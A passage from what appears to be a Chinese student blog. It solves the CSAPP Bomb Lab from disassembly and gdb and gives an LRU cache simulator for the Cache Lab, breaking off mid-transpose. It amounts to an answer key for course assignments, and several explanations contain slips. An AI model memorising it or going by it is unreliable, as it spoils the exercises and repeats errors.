$0x5,%eax 401492: 7f 05 jg 401499 &lt;read_six_numbers+0x3d&gt; 401494: e8 a1 ff ff ff callq 40143a &lt;explode_bomb&gt; 401499: 48 83 c4 18 add $0x18,%rsp 40149d: c3 retq 我们首先看到有一个 sscanf 函数，那么按照惯例，其上的 %esi 应该是传入这个函数的参数，在gdb中打印这个参数看到 &quot;%d %d %d %d %d %d&quot; 显然。然后我们分析这6个数字在 stack 和 register 中是怎么存储的。 首先这里的 %rsi 是从 phase_2 这个函数中得到的参数，其参数是 phase_2 函数中申请到的 stack top。 %rdx 存储的实际上是 phase_2 的 stack top。存储的是第一个参数 %rcx 是 stack top + 0x4。存储第二个参数。显然这里的参数类型是 int。 %r8 是 stack top + 0x8。存储第三个参数。 %r9 是 stack top + 0xc。存储第四个参数。 之后的两个值需要压栈传参。 stack top + 0x10。在 read_six_numbers 函数中是 %rsp 。存储第五个参数。 stack top + 0x14。在 read_six_numbers 函数中是 %rsp + 0x8 。存储第二个参数。 函数之后再接受了 sscanf 的参数，得到参数数量，并作比较。 再看 phase_2 函数就非常简单了，转换为C语言表述如下。 1234567if ((*rsp[0]) == 1){ for (int i = 0; i &lt; 5; i++){ if ((*rsp[i+1])!=(*rsp[i]*2)) explode_bomb(); }}else{ explode_bomb();} 根据这个思路，得到最终的结果为 1,2,4,8,16,32 2.3 phase 3同理，找到 phase_3 的函数入口 123456789101112131415161718192021222324252627282930313233343536370000000000400f43 &lt;phase_3&gt;: 400f43: 48 83 ec 18 sub $0x18,%rsp 400f47: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 400f4c: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 400f51: be cf 25 40 00 mov $0x4025cf,%esi 400f56: b8 00 00 00 00 mov $0x0,%eax 400f5b: e8 90 fc ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 400f60: 83 f8 01 cmp $0x1,%eax 400f63: 7f 05 jg 400f6a &lt;phase_3+0x27&gt; 400f65: e8 d0 04 00 00 callq 40143a &lt;explode_bomb&gt; 400f6a: 83 7c 24 08 07 cmpl $0x7,0x8(%rsp) 400f6f: 77 3c ja 400fad &lt;phase_3+0x6a&gt; 400f71: 8b 44 24 08 mov 0x8(%rsp),%eax 400f75: ff 24 c5 70 24 40 00 jmpq *0x402470(,%rax,8) 400f7c: b8 cf 00 00 00 mov $0xcf,%eax -- 当第一个数为0时跳转到此处 400f81: eb 3b jmp 400fbe &lt;phase_3+0x7b&gt; 400f83: b8 c3 02 00 00 mov $0x2c3,%eax -- 当第一个数为2时跳转到此处 400f88: eb 34 jmp 400fbe &lt;phase_3+0x7b&gt; 400f8a: b8 00 01 00 00 mov $0x100,%eax -- 当第一个数为3时跳转到此处 400f8f: eb 2d jmp 400fbe &lt;phase_3+0x7b&gt; 400f91: b8 85 01 00 00 mov $0x185,%eax -- 当第一个数为4时跳转到此处 400f96: eb 26 jmp 400fbe &lt;phase_3+0x7b&gt; 400f98: b8 ce 00 00 00 mov $0xce,%eax -- 当第一个数为5时跳转到此处 400f9d: eb 1f jmp 400fbe &lt;phase_3+0x7b&gt; 400f9f: b8 aa 02 00 00 mov $0x2aa,%eax -- 当第一个数为6时跳转到此处 400fa4: eb 18 jmp 400fbe &lt;phase_3+0x7b&gt; 400fa6: b8 47 01 00 00 mov $0x147,%eax 400fab: eb 11 jmp 400fbe &lt;phase_3+0x7b&gt; 400fad: e8 88 04 00 00 callq 40143a &lt;explode_bomb&gt; 400fb2: b8 00 00 00 00 mov $0x0,%eax 400fb7: eb 05 jmp 400fbe &lt;phase_3+0x7b&gt; 400fb9: b8 37 01 00 00 mov $0x137,%eax -- 当第一个数为1时跳转到此处 400fbe: 3b 44 24 0c cmp 0xc(%rsp),%eax 400fc2: 74 05 je 400fc9 &lt;phase_3+0x86&gt; 400fc4: e8 71 04 00 00 callq 40143a &lt;explode_bomb&gt; 400fc9: 48 83 c4 18 add $0x18,%rsp 400fcd: c3 retq 首先，栈申请了 18 byte。盲猜用 sscanf 传入了两个 int 类型的参数，使用 gdb 打印 0x4025cf 位置的内存，得到 &quot;%d %d&quot; ，正确。接下来做了一个判断，判断传进来的参数量。然后判断了传进来的第一个参数是否小于7，跳转跳转到0x402470+8*%eax地址所存储的地址。发现 %eax 与输入有关。比如我现在的 %rax 是 0，那么跳转的地址就是 0x402470 中存储的值 0xf7c，把 0xcf 写入到 %eax 中进行比较。这里有多个答案，第一个数从0→6都行，后面的数按照这个跳转表来就行。 2.4 phase 4同理，找到 phase_4 的函数入口 1234567891011121314151617181920212223000000000040100c &lt;phase_4&gt;: 40100c: 48 83 ec 18 sub $0x18,%rsp 401010: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 401015: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 40101a: be cf 25 40 00 mov $0x4025cf,%esi 40101f: b8 00 00 00 00 mov $0x0,%eax 401024: e8 c7 fb ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 401029: 83 f8 02 cmp $0x2,%eax 40102c: 75 07 jne 401035 &lt;phase_4+0x29&gt; 40102e: 83 7c 24 08 0e cmpl $0xe,0x8(%rsp) 401033: 76 05 jbe 40103a &lt;phase_4+0x2e&gt; 401035: e8 00 04 00 00 callq 40143a &lt;explode_bomb&gt; 40103a: ba 0e 00 00 00 mov $0xe,%edx 40103f: be 00 00 00 00 mov $0x0,%esi 401044: 8b 7c 24 08 mov 0x8(%rsp),%edi 401048: e8 81 ff ff ff callq 400fce &lt;func4&gt; 40104d: 85 c0 test %eax,%eax 40104f: 75 07 jne 401058 &lt;phase_4+0x4c&gt; 401051: 83 7c 24 0c 00 cmpl $0x0,0xc(%rsp) 401056: 74 05 je 40105d &lt;phase_4+0x51&gt; 401058: e8 dd 03 00 00 callq 40143a &lt;explode_bomb&gt; 40105d: 48 83 c4 18 add $0x18,%rsp 401061: c3 retq sscanf 读入了 %d %d 到 %rdx %rcx ，假设读入的两个参数是 a,b 。 用c语言描述这个函数就是: 12345678910111213int phase_4(){ int a, b; int c = sscanf(&quot;%d %d&quot;, &amp;a, &amp;b); if (c != 2){explode_bomb();} if (a &lt;= 0xe){ int fans = func4(a, 0x0, 0xe); if (fans != 0 || b != 0){ explode_bomb(); } }else { explode_bomb(); }} 说明 fans 和 输入的 b 都必须是 0。如果 14 ≤ a，跳转到 func4 ， func4 的入口： 12345678910111213141516171819202122230000000000400fce &lt;func4&gt;: 400fce: 48 83 ec 08 sub $0x8,%rsp 400fd2: 89 d0 mov %edx,%eax 400fd4: 29 f0 sub %esi,%eax 400fd6: 89 c1 mov %eax,%ecx 400fd8: c1 e9 1f shr $0x1f,%ecx 400fdb: 01 c8 add %ecx,%eax 400fdd: d1 f8 sar %eax 400fdf: 8d 0c 30 lea (%rax,%rsi,1),%ecx 400fe2: 39 f9 cmp %edi,%ecx 400fe4: 7e 0c jle 400ff2 &lt;func4+0x24&gt; 400fe6: 8d 51 ff lea -0x1(%rcx),%edx 400fe9: e8 e0 ff ff ff callq 400fce &lt;func4&gt; 400fee: 01 c0 add %eax,%eax 400ff0: eb 15 jmp 401007 &lt;func4+0x39&gt; 400ff2: b8 00 00 00 00 mov $0x0,%eax 400ff7: 39 f9 cmp %edi,%ecx 400ff9: 7d 0c jge 401007 &lt;func4+0x39&gt; 400ffb: 8d 71 01 lea 0x1(%rcx),%esi 400ffe: e8 cb ff ff ff callq 400fce &lt;func4&gt; 401003: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401007: 48 83 c4 08 add $0x8,%rsp 40100b: c3 retq 用c语言描述 func4 12345678910111213141516171819202122232425// edi-&gt;a, esi-&gt;b, edx-&gt;c// the rules of X86-64 conventional set %rdi, %rsi, %rdx as 1-&gt;3 parameters' register.int func4(int a, int b, int c){ int ans = c - b; int tmp = ans &gt;&gt; 31; // tmp is register %ecx in func4. ans = (tmp + ans) &gt;&gt; 1; tmp = ans + b; if (a &gt;= tmp){ ans = 0; if (a &lt;= tmp){ return ans; } else{ b = c + 1; ans = func4(a, b, c); ans = 2 * ans + 1; return ans; } } else{ c = tmp - 1; ans = func4(a, b, c); return ans * 2; }} 为了让输出是 0 ，当 tmp = a 时返回的 ans=0 ，因为 b = 0x0，c = 0xe，tmp = 7 = ans 所以最终的答案是 0 7 2.5 phase 512345678910111213141516171819202122232425262728293031323334353637383940410000000000401062 &lt;phase_5&gt;: 401062: 53 push %rbx 401063: 48 83 ec 20 sub $0x20,%rsp // stack frame depth 0x20 byte 401067: 48 89 fb mov %rdi,%rbx // A parameter load in, string address 40106a: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax // canary of stack; 401071: 00 00 401073: 48 89 44 24 18 mov %rax,0x18(%rsp) // canary store. 401078: 31 c0 xor %eax,%eax 40107a: e8 9c 02 00 00 callq 40131b &lt;string_length&gt; // string address is %rbx 40107f: 83 f8 06 cmp $0x6,%eax // find string length must be 6; 401082: 74 4e je 4010d2 &lt;phase_5+0x70&gt; 401084: e8 b1 03 00 00 callq 40143a &lt;explode_bomb&gt; 401089: eb 47 jmp 4010d2 &lt;phase_5+0x70&gt; 40108b: 0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx // get single character 40108f: 88 0c 24 mov %cl,(%rsp) 401092: 48 8b 14 24 mov (%rsp),%rdx // move single character to rdx 401096: 83 e2 0f and $0xf,%edx // get lower-bits of %rdx 401099: 0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx 4010a0: 88 54 04 10 mov %dl,0x10(%rsp,%rax,1) 4010a4: 48 83 c0 01 add $0x1,%rax 4010a8: 48 83 f8 06 cmp $0x6,%rax // loop 6 times. 4010ac: 75 dd jne 40108b &lt;phase_5+0x29&gt; 4010ae: c6 44 24 16 00 movb $0x0,0x16(%rsp) // last '\\0' in string. 4010b3: be 5e 24 40 00 mov $0x40245e,%esi // compare string %esi and %rdi 4010b8: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi // compare string %esi and %rdi 4010bd: e8 76 02 00 00 callq 401338 &lt;strings_not_equal&gt; 4010c2: 85 c0 test %eax,%eax 4010c4: 74 13 je 4010d9 &lt;phase_5+0x77&gt; 4010c6: e8 6f 03 00 00 callq 40143a &lt;explode_bomb&gt; 4010cb: 0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) 4010d0: eb 07 jmp 4010d9 &lt;phase_5+0x77&gt; 4010d2: b8 00 00 00 00 mov $0x0,%eax // set ans = 0; 4010d7: eb b2 jmp 40108b &lt;phase_5+0x29&gt; 4010d9: 48 8b 44 24 18 mov 0x18(%rsp),%rax 4010de: 64 48 33 04 25 28 00 xor %fs:0x28,%rax 4010e5: 00 00 4010e7: 74 05 je 4010ee &lt;phase_5+0x8c&gt; 4010e9: e8 42 fa ff ff callq 400b30 &lt;__stack_chk_fail@plt&gt; // stack canary 4010ee: 48 83 c4 20 add $0x20,%rsp 4010f2: 5b pop %rbx 4010f3: c3 retq gdb 打印 0x4024b0 处的字符串，得到 maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you? 打印位于 0x40245e 处的字符串，得到 &quot;flyers&quot; 。显然最后的结果需要与这个作比较。如代码中的注释显示，这里做的操作就是读取我输入的字符串的每个字符，然后把这个字符的后4个bit取出来作为 offsite 在 0x4024b0 处的字符串中找到相应的字符。 2.6 phase 6 loop &amp; linked-list1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878800000000004010f4 &lt;phase_6&gt;: 4010f4: 41 56 push %r14 4010f6: 41 55 push %r13 4010f8: 41 54 push %r12 4010fa: 55 push %rbp 4010fb: 53 push %rbx 4010fc: 48 83 ec 50 sub $0x50,%rsp // stack init 401100: 49 89 e5 mov %rsp,%r13 401103: 48 89 e6 mov %rsp,%rsi 401106: e8 51 03 00 00 callq 40145c &lt;read_six_numbers&gt; // read six value 40110b: 49 89 e6 mov %rsp,%r14 40110e: 41 bc 00 00 00 00 mov $0x0,%r12d 401114: 4c 89 ed mov %r13,%rbp 401117: 41 8b 45 00 mov 0x0(%r13),%eax 40111b: 83 e8 01 sub $0x1,%eax 40111e: 83 f8 05 cmp $0x5,%eax 401121: 76 05 jbe 401128 &lt;phase_6+0x34&gt; 401123: e8 12 03 00 00 callq 40143a &lt;explode_bomb&gt; 401128: 41 83 c4 01 add $0x1,%r12d 40112c: 41 83 fc 06 cmp $0x6,%r12d 401130: 74 21 je 401153 &lt;phase_6+0x5f&gt; 401132: 44 89 e3 mov %r12d,%ebx 401135: 48 63 c3 movslq %ebx,%rax 401138: 8b 04 84 mov (%rsp,%rax,4),%eax 40113b: 39 45 00 cmp %eax,0x0(%rbp) 40113e: 75 05 jne 401145 &lt;phase_6+0x51&gt; 401140: e8 f5 02 00 00 callq 40143a &lt;explode_bomb&gt; 401145: 83 c3 01 add $0x1,%ebx 401148: 83 fb 05 cmp $0x5,%ebx 40114b: 7e e8 jle 401135 &lt;phase_6+0x41&gt; 40114d: 49 83 c5 04 add $0x4,%r13 401151: eb c1 jmp 401114 &lt;phase_6+0x20&gt; 401153: 48 8d 74 24 18 lea 0x18(%rsp),%rsi 401158: 4c 89 f0 mov %r14,%rax 40115b: b9 07 00 00 00 mov $0x7,%ecx 401160: 89 ca mov %ecx,%edx 401162: 2b 10 sub (%rax),%edx 401164: 89 10 mov %edx,(%rax) 401166: 48 83 c0 04 add $0x4,%rax 40116a: 48 39 f0 cmp %rsi,%rax 40116d: 75 f1 jne 401160 &lt;phase_6+0x6c&gt; 40116f: be 00 00 00 00 mov $0x0,%esi 401174: eb 21 jmp 401197 &lt;phase_6+0xa3&gt; 401176: 48 8b 52 08 mov 0x8(%rdx),%rdx 40117a: 83 c0 01 add $0x1,%eax 40117d: 39 c8 cmp %ecx,%eax 40117f: 75 f5 jne 401176 &lt;phase_6+0x82&gt; 401181: eb 05 jmp 401188 &lt;phase_6+0x94&gt; 401183: ba d0 32 60 00 mov $0x6032d0,%edx 401188: 48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2) 40118d: 48 83 c6 04 add $0x4,%rsi 401191: 48 83 fe 18 cmp $0x18,%rsi 401195: 74 14 je 4011ab &lt;phase_6+0xb7&gt; 401197: 8b 0c 34 mov (%rsp,%rsi,1),%ecx 40119a: 83 f9 01 cmp $0x1,%ecx 40119d: 7e e4 jle 401183 &lt;phase_6+0x8f&gt; 40119f: b8 01 00 00 00 mov $0x1,%eax 4011a4: ba d0 32 60 00 mov $0x6032d0,%edx 4011a9: eb cb jmp 401176 &lt;phase_6+0x82&gt; 4011ab: 48 8b 5c 24 20 mov 0x20(%rsp),%rbx 4011b0: 48 8d 44 24 28 lea 0x28(%rsp),%rax 4011b5: 48 8d 74 24 50 lea 0x50(%rsp),%rsi 4011ba: 48 89 d9 mov %rbx,%rcx 4011bd: 48 8b 10 mov (%rax),%rdx 4011c0: 48 89 51 08 mov %rdx,0x8(%rcx) 4011c4: 48 83 c0 08 add $0x8,%rax 4011c8: 48 39 f0 cmp %rsi,%rax 4011cb: 74 05 je 4011d2 &lt;phase_6+0xde&gt; 4011cd: 48 89 d1 mov %rdx,%rcx 4011d0: eb eb jmp 4011bd &lt;phase_6+0xc9&gt; 4011d2: 48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx) 4011d9: 00 4011da: bd 05 00 00 00 mov $0x5,%ebp 4011df: 48 8b 43 08 mov 0x8(%rbx),%rax 4011e3: 8b 00 mov (%rax),%eax 4011e5: 39 03 cmp %eax,(%rbx) 4011e7: 7d 05 jge 4011ee &lt;phase_6+0xfa&gt; 4011e9: e8 4c 02 00 00 callq 40143a &lt;explode_bomb&gt; 4011ee: 48 8b 5b 08 mov 0x8(%rbx),%rbx 4011f2: 83 ed 01 sub $0x1,%ebp 4011f5: 75 e8 jne 4011df &lt;phase_6+0xeb&gt; 4011f7: 48 83 c4 50 add $0x50,%rsp 4011fb: 5b pop %rbx 4011fc: 5d pop %rbp 4011fd: 41 5c pop %r12 4011ff: 41 5d pop %r13 401201: 41 5e pop %r14 401203: c3 retq 首先读入了6个数字，分别放入了%rsp+0x0、%rsp+0x4、%rsp+0x8、%rsp+0xc、%rsp+0x10、%rsp+0x14 。然后是大循环内嵌小循环，大循环中部分的作用是确定每个数必须&lt;=6；小循环的作用是确定第i个数不和第i+1第6个数相同（也就是输入的所有数字不能有相同的）。然后，再是一个大循环，主要作用就是令a[i]=7-a[i],i=1,2,3,4,5,6，就是将存于栈中的数（也是你输入的数）进行对7求补并保存回原位置。接下来又是一个大循环套一个小循环，主要作用是访问一个链表，链表的首地址为0x6032d0，针对输入的第i个数，按照a[i]的值获取链表第a[i]个节点，并把节点首地址放入%rsp+0x20+0x0到%rsp+0x20+0x28刚好是6个节点。然后又是一个大循环，主要是说明 %rsp+0x20+0x0 ~到%rsp+0x20+0x28存储的链表节点值必须是递减的。找到了各节点的值，我们就可以排序得到节点标号的排序，节点标号的排序恰恰是输入6个数字对7求补的值，然后再对7求补即可得到结果4 3 2 1 6 5。 2.7 secret phase查看 phase_defused 的 assembly code 12345678910111213141516171819202122232425262728293031323334353600000000004015c4 &lt;phase_defused&gt;: 4015c4: 48 83 ec 78 sub $0x78,%rsp 4015c8: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax 4015cf: 00 00 4015d1: 48 89 44 24 68 mov %rax,0x68(%rsp) 4015d6: 31 c0 xor %eax,%eax 4015d8: 83 3d 81 21 20 00 06 cmpl $0x6,0x202181(%rip) # 603760 &lt;num_input_strings&gt; 4015df: 75 5e jne 40163f &lt;phase_defused+0x7b&gt; 4015e1: 4c 8d 44 24 10 lea 0x10(%rsp),%r8 4015e6: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 4015eb: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 4015f0: be 19 26 40 00 mov $0x402619,%esi 4015f5: bf 70 38 60 00 mov $0x603870,%edi 4015fa: e8 f1 f5 ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 4015ff: 83 f8 03 cmp $0x3,%eax 401602: 75 31 jne 401635 &lt;phase_defused+0x71&gt; 401604: be 22 26 40 00 mov $0x402622,%esi 401609: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi 40160e: e8 25 fd ff ff callq 401338 &lt;strings_not_equal&gt; 401613: 85 c0 test %eax,%eax 401615: 75 1e jne 401635 &lt;phase_defused+0x71&gt; 401617: bf f8 24 40 00 mov $0x4024f8,%edi 40161c: e8 ef f4 ff ff callq 400b10 &lt;puts@plt&gt; 401621: bf 20 25 40 00 mov $0x402520,%edi 401626: e8 e5 f4 ff ff callq 400b10 &lt;puts@plt&gt; 40162b: b8 00 00 00 00 mov $0x0,%eax 401630: e8 0d fc ff ff callq 401242 &lt;secret_phase&gt; 401635: bf 58 25 40 00 mov $0x402558,%edi 40163a: e8 d1 f4 ff ff callq 400b10 &lt;puts@plt&gt; 40163f: 48 8b 44 24 68 mov 0x68(%rsp),%rax 401644: 64 48 33 04 25 28 00 xor %fs:0x28,%rax 40164b: 00 00 40164d: 74 05 je 401654 &lt;phase_defused+0x90&gt; 40164f: e8 dc f4 ff ff callq 400b30 &lt;__stack_chk_fail@plt&gt; 401654: 48 83 c4 78 add $0x78,%rsp 401658: c3 retq 可以知道，第四关和第五关前两个都是输入整型，测试一下发现必须要在第四关（第五关不必要）输入的两个整形后面输入”DrEvil”才能成功触发。在gdb中测试，发现 0x402622:”DrEvil” 。 12345678910111213141516171819202122230000000000401242 &lt;secret_phase&gt;: 401242: 53 push %rbx 401243: e8 56 02 00 00 callq 40149e &lt;read_line&gt; 401248: ba 0a 00 00 00 mov $0xa,%edx 40124d: be 00 00 00 00 mov $0x0,%esi 401252: 48 89 c7 mov %rax,%rdi 401255: e8 76 f9 ff ff callq 400bd0 &lt;strtol@plt&gt; 40125a: 48 89 c3 mov %rax,%rbx 40125d: 8d 40 ff lea -0x1(%rax),%eax 401260: 3d e8 03 00 00 cmp $0x3e8,%eax 401265: 76 05 jbe 40126c &lt;secret_phase+0x2a&gt; 401267: e8 ce 01 00 00 callq 40143a &lt;explode_bomb&gt; 40126c: 89 de mov %ebx,%esi 40126e: bf f0 30 60 00 mov $0x6030f0,%edi 401273: e8 8c ff ff ff callq 401204 &lt;fun7&gt; 401278: 83 f8 02 cmp $0x2,%eax 40127b: 74 05 je 401282 &lt;secret_phase+0x40&gt; 40127d: e8 b8 01 00 00 callq 40143a &lt;explode_bomb&gt; 401282: bf 38 24 40 00 mov $0x402438,%edi 401287: e8 84 f8 ff ff callq 400b10 &lt;puts@plt&gt; 40128c: e8 33 03 00 00 callq 4015c4 &lt;phase_defused&gt; 401291: 5b pop %rbx 401292: c3 retq 查看 func7 的 assembly code 1234567891011121314151617181920210000000000401204 &lt;fun7&gt;: 401204: 48 83 ec 08 sub $0x8,%rsp 401208: 48 85 ff test %rdi,%rdi 40120b: 74 2b je 401238 &lt;fun7+0x34&gt; 40120d: 8b 17 mov (%rdi),%edx 40120f: 39 f2 cmp %esi,%edx 401211: 7e 0d jle 401220 &lt;fun7+0x1c&gt; 401213: 48 8b 7f 08 mov 0x8(%rdi),%rdi 401217: e8 e8 ff ff ff callq 401204 &lt;fun7&gt; 40121c: 01 c0 add %eax,%eax 40121e: eb 1d jmp 40123d &lt;fun7+0x39&gt; 401220: b8 00 00 00 00 mov $0x0,%eax 401225: 39 f2 cmp %esi,%edx 401227: 74 14 je 40123d &lt;fun7+0x39&gt; 401229: 48 8b 7f 10 mov 0x10(%rdi),%rdi 40122d: e8 d2 ff ff ff callq 401204 &lt;fun7&gt; 401232: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401236: eb 05 jmp 40123d &lt;fun7+0x39&gt; 401238: b8 ff ff ff ff mov $0xffffffff,%eax 40123d: 48 83 c4 08 add $0x8,%rsp 401241: c3 retq 可以推断出 func7 的 c 代码是 123456int func7(int *p, int n){ if (!p) return 0; if (*p &lt; n) return 2 * func7(*(p+8), n) + 1; else if (*p == n) return 0; else return 2*fun7(*(p+4), n);} 根据secret_phase的返回值为0得到输入的值与指针指向的值相等，即0x24，对应的十进制为36","link":"/2022/02/02/%5Bcsapp%5D%20Lab2%20Bomb%20Lab/"},{"title":"[csapp] Lab4 Cache Lab","text":"Lab4 Cache Lab1. Writing a cache simulator这个 simulator 非常的简单，完全模拟 LRU 算法就行了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216/* @author: chenghua.Wang * @time: 2022/02/17 * @breif: A LRU(least recently used) cache simulator. * A file of CSAPP cache lab. Puzzle A. * @note: compiled on ubuntu20.04 x86-64. gcc 9.3.0. */#include &quot;cachelab.h&quot;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;getopt.h&gt;#include &lt;limits.h&gt;#include &lt;inttypes.h&gt;#define True 1#define Fasle 0#define _string_buf_ 1024typedef int32_t bool;// data structtypedef struct{ bool h, v; int32_t s, E, b; char t[_string_buf_];}_argument_unit_;typedef struct{ int64_t hit_cnt, miss_cnt, eviction_cnt;}_cnt_unit_;typedef struct{ int32_t valid; // bits int32_t tag; int32_t stamp; // used to count Least recently block.}_cache_line_;typedef struct{ _cache_line_ *cache_lines;}_cache_set_, *_cache_set_p_;// global data init._argument_unit_ arg_unit;_cnt_unit_ cnt_unit;// argument process function set.void help_arg();bool check_arg();// cache update and init function set._cache_set_p_ init_cache();void cache_update(uint32_t address, _cache_set_p_ cache_sets);void cache_update_stamp(_cache_set_p_ cache_sets);void simulate_cache();int main(int argc, char *argv[]){ arg_unit.h = arg_unit.v = Fasle; arg_unit.b = arg_unit.E = arg_unit.s = 0; cnt_unit.eviction_cnt = cnt_unit.hit_cnt = cnt_unit.miss_cnt = 0; int32_t opt; while(-1 != (opt = (getopt(argc, argv, &quot;hvs:E:b:t:&quot;)))){ switch (opt) { case 'h': help_arg(); arg_unit.h = True; break; case 'v': arg_unit.v = True; help_arg(); break; case 's': arg_unit.s = atoi(optarg); break; case 'E': arg_unit.E = atoi(optarg); break; case 'b': arg_unit.b = atoi(optarg); break; case 't': strcpy(arg_unit.t, optarg); break; default: help_arg(); break; } } check_arg(); simulate_cache(); printSummary(cnt_unit.hit_cnt, cnt_unit.miss_cnt, cnt_unit.eviction_cnt); return 0;}// argument process function set.void help_arg(){ printf(&quot;Usage: ./csim-ref [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;\\n&quot;); printf(&quot;-h: Optional help flag that prints usage info\\n&quot;); printf(&quot;-v: Optional verbose flag that displays trace info\\n&quot;); printf(&quot;-s &lt;s&gt;: Number of set index bits\\n&quot;); printf(&quot;-E &lt;E&gt;: Associativity (number of lines per set)\\n&quot;); printf(&quot;-b &lt;b&gt;: Number of block bits\\n&quot;); printf(&quot;-t &lt;tracefile&gt;: Name of the valgrind trace to replay\\n&quot;); return;}bool check_arg(){ if(arg_unit.s&lt;=0 || arg_unit.E&lt;=0 || arg_unit.b&lt;=0 || arg_unit.t==NULL) return Fasle; else return True;}// cache update and init function set._cache_set_p_ init_cache(){ /* get memory for sets and cache_line * s is Number of set index bits. so S = 2^s is the number of sets. * E is Associativity (number of lines per set) * b is Number of block bits */ int32_t tmp_S = 1 &lt;&lt; arg_unit.s; _cache_set_p_ _ret_cache_sets = (_cache_set_p_)malloc(sizeof(_cache_set_) * tmp_S); for (int32_t i = 0; i &lt; tmp_S; ++i){ _ret_cache_sets[i].cache_lines = (_cache_line_ *)malloc(sizeof(_cache_line_) * arg_unit.E); for (int32_t j = 0; j &lt; arg_unit.E; ++j){ _ret_cache_sets[i].cache_lines[j].valid = 0; _ret_cache_sets[i].cache_lines[j].tag = -1; _ret_cache_sets[i].cache_lines[j].stamp = -1; } } return _ret_cache_sets;}void cache_update(uint32_t address, _cache_set_p_ cache_sets){ // update cache, use address. // b is the Number of block bits int32_t set_index_address = (address &gt;&gt; arg_unit.b) &amp; ((-1U) &gt;&gt; (64 - arg_unit.s)); int32_t tag_address = address &gt;&gt; (arg_unit.b + arg_unit.s); // hit. for (int32_t i = 0; i &lt; arg_unit.E; ++i){ if (cache_sets[set_index_address].cache_lines[i].tag == tag_address){ cache_sets[set_index_address].cache_lines[i].stamp = 0; cnt_unit.hit_cnt ++; return; } } // miss but have blank line. for (int32_t i = 0; i &lt; arg_unit.E; ++i){ if (cache_sets[set_index_address].cache_lines[i].valid == 0){ cache_sets[set_index_address].cache_lines[i].valid = 1; cache_sets[set_index_address].cache_lines[i].tag = tag_address; cache_sets[set_index_address].cache_lines[i].stamp = 0; cnt_unit.miss_cnt ++; return; } } // miss and need to be replaced. cnt_unit.miss_cnt ++; cnt_unit.eviction_cnt ++; int32_t max_stamp = INT_MIN; int32_t max_stamp_idx = -1; for (int32_t i = 0; i &lt; arg_unit.E; ++i){ if (cache_sets[set_index_address].cache_lines[i].stamp &gt; max_stamp){ max_stamp = cache_sets[set_index_address].cache_lines[i].stamp; max_stamp_idx = i; } } cache_sets[set_index_address].cache_lines[max_stamp_idx].tag = tag_address; cache_sets[set_index_address].cache_lines[max_stamp_idx].stamp = 0; return;}void cache_update_stamp(_cache_set_p_ cache_sets){ int32_t tmp_S = 1 &lt;&lt; arg_unit.s; for (int32_t i = 0; i &lt; tmp_S; ++i){ for (int32_t j = 0; j &lt; arg_unit.E; ++j){ cache_sets[i].cache_lines[j].stamp ++; } } return;}void simulate_cache(){ /* Start simulate. * Read data from file(t). * The format in file is &lt;op + address + size&gt; * &quot;I 0400d7d4,8&quot; * &quot; M 0421c7f0,4&quot; * &quot; L 04f6b868,8&quot; * &quot; S 7ff0005c8,8&quot; * ignore I instruction. */ int32_t tmp_S = 1 &lt;&lt; arg_unit.s; FILE* fp = fopen(arg_unit.t, &quot;r&quot;); if(fp == NULL){ printf(&quot;open error&quot;); exit(-1); } _cache_set_p_ cache_sets = init_cache(); char op; uint32_t address; int32_t size; while(fscanf(fp, &quot; %c %xu,%d\\n&quot;, &amp;op, &amp;address, &amp;size) &gt; 0){ switch (op){ case 'L': cache_update(address, cache_sets); break; case 'M': cache_update(address, cache_sets); case 'S': cache_update(address, cache_sets); break; } cache_update_stamp(cache_sets); } fclose(fp); for (int32_t i = 0; i &lt; tmp_S; ++i){ free(cache_sets[i].cache_lines); } free(cache_sets);} 2 Optimizing matrix transpose首先测试的前提是 cache 32-set，each set has only one cache line，and each cache line has 32 bytes. 最多使用 12 个变量 2.1 32 x 32先使用最原始的方法： 123456789if (M == 32){ int tmp; for (int i = 0; i &lt; N; i++) { for (int j = 0; j &lt; M; j++) { tmp = A[i][j]; B[j][i] = tmp; } }} 显然，这样得到的结果是糟糕的。 12345678910111213Function 0 (2 total)Step 1: Validating and generating memory tracesStep 2: Evaluating performance (s=5, E=1, b=5)func 0 (Transpose submission): hits:870, misses:1183, evictions:1151Function 1 (2 total)Step 1: Validating and generating memory tracesStep 2: Evaluating performance (s=5, E=1, b=5)func 1 (Simple row-wise scan transpose): hits:870, misses:1183, evictions:1151Summary for official submission (func 0): correctness=1 misses=1183TEST_TRANS_RESULTS=1:1183 可以看到 miss 数达到了惊人的 1183 个。 8x8 的分块 对于 32 x 32 的矩阵非常容易想到可以使用 8 x 8 的分块。因为 cache line 一行能够存储的一共就是 8 Byte，在 32 x 32 的矩阵中，一行有 32 个 int， 一共就是需要 4 个 cache line 可以，那么所有 cache 可以装下矩阵的 8 行。所以这里使用 8 x 8 分块。 1234567if (M == 32){ for (int i = 0; i &lt; N; i 